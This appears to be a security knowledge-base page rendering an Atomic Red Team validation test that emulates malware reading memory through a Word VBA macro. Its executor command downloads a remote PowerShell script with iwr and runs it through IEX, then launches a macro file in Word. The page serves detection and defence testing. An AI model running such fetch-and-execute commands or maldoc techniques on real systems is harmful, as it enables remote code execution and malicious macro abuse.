---
atomic_guid: "8faff437-a114-4547-9a60-749652a03df6"
title: "Extract Memory via VBA"
framework: "atomic"
generated: "true"
attack_technique_id: "T1059.005"
attack_technique_name: "Command and Scripting Interpreter: Visual Basic"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.005/T1059.005.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "8faff437-a114-4547-9a60-749652a03df6"
  - "Extract Memory via VBA"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Extract Memory via VBA

This module attempts to emulate malware authors utilizing well known techniques to extract data from memory/binary files. To do this
we first create a string in memory then pull out the pointer to that string. Finally, it uses this pointer to copy the contents of that
memory location to a file stored in the $env:TEMP\atomic_t1059_005_test_output.bin.

## Metadata

- Atomic GUID: 8faff437-a114-4547-9a60-749652a03df6
- Technique: T1059.005: Command and Scripting Interpreter: Visual Basic
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1059.005/T1059.005.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1059-command_and_scripting_interpreter|T1059.005]]

## Input Arguments

### ms_product

- description: Maldoc application Word
- type: string
- default: Word

## Dependencies

Microsoft #{ms_product} must be installed

### Prerequisite Check

```powershell
try {
  New-Object -COMObject "#{ms_product}.Application" | Out-Null
  $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
```

### Get Prerequisite

```powershell
Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
```

## Executor

- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059_005-macrocode.txt" -officeProduct "Word" -sub "Extract"
```

### Cleanup

```powershell
Remove-Item "$env:TEMP\atomic_t1059_005_test_output.bin" -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.005/T1059.005.yaml)
